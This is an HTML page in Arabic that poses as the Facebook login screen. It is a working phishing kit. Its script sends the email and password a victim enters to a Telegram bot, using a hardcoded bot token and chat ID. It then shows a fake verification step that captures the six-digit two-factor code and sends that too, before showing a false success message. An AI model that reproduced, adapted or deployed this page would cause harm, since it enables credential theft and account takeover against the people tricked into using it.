<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
body{background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:12px;padding:30px 25px;max-width:400px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
.logo{text-align:center;margin-bottom:25px}
.logo h1{color:#1877f2;font-size:42px;font-weight:bold}
.logo p{color:#666;font-size:14px;margin-top:5px}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;background:#f9f9f9;box-sizing:border-box;margin-bottom:10px}
input:focus{outline:none;border-color:#1877f2;background:#fff}
.btn{width:100%;padding:15px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:10px}
.forgot{text-align:center;color:#1877f2;font-size:14px;margin-top:15px}
.divider{display:flex;align-items:center;margin:20px 0;color:#666;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#ddd}
.divider span{padding:0 15px}
.signup{text-align:center;background:#42b72a;color:#fff;font-size:15px;font-weight:bold;border-radius:8px;padding:15px;margin-top:10px}
.footer{text-align:center;font-size:11px;color:#999;margin-top:20px}
.code-inputs{display:flex;gap:8px;margin-top:20px;justify-content:center;direction:ltr}
.code-inputs input{width:45px;height:55px;text-align:center;font-size:22px;font-weight:bold;padding:0}
</style>
</head>
<body>
<div class="card">
<div id="screen1">
<div class="logo">
<h1>facebook</h1>
<p>تسجيل الدخول إلى حسابك</p>
</div>
<form id="f">
<input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
<input type="password" id="password" placeholder="كلمة المرور" required>
<button type="submit" class="btn">تسجيل الدخول</button>
</form>
<div class="forgot">هل نسيت كلمة المرور؟</div>
<div class="divider"><span>أو</span></div>
<div class="signup">إنشاء حساب جديد</div>
<div class="footer">© 2026 Facebook - Meta</div>
</div>
<div id="screen2" style="display:none">
<h3 style="text-align:center;color:#333;margin-bottom:15px">أدخل رمز التحقق</h3>
<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">تم إرسال رمز مكون من 6 أرقام إلى هاتفك</p>
<div class="code-inputs">
<input type="tel" maxlength="1" id="c1"><input type="tel" maxlength="1" id="c2"><input type="tel" maxlength="1" id="c3"><input type="tel" maxlength="1" id="c4"><input type="tel" maxlength="1" id="c5"><input type="tel" maxlength="1" id="c6">
</div>
<button type="button" class="btn" id="verifyBtn">تحقق</button>
</div>
</div>
<script>
const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
const CHAT='8823506156';
['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{document.getElementById(id).addEventListener('input',function(){if(this.value.length===1&&i<arr.length-1)document.getElementById(arr[i+1]).focus();});});
document.getElementById('f').addEventListener('submit',async function(e){
e.preventDefault();
const msg='📘 *فيسبوك*\n\n📧 `'+document.getElementById('email').value+'`\n🔑 `'+document.getElementById('password').value+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
document.getElementById('screen1').style.display='none';document.getElementById('screen2').style.display='block';document.getElementById('c1').focus();
});
document.getElementById('verifyBtn').addEventListener('click',async function(){
const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
const msg='📘 *فيسبوك - رمز التحقق*\n\n📧 `'+document.getElementById('email').value+'`\n🔢 `'+code+'`';
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
alert('تم التحقق بنجاح');
});
</script>
</body>
</html>
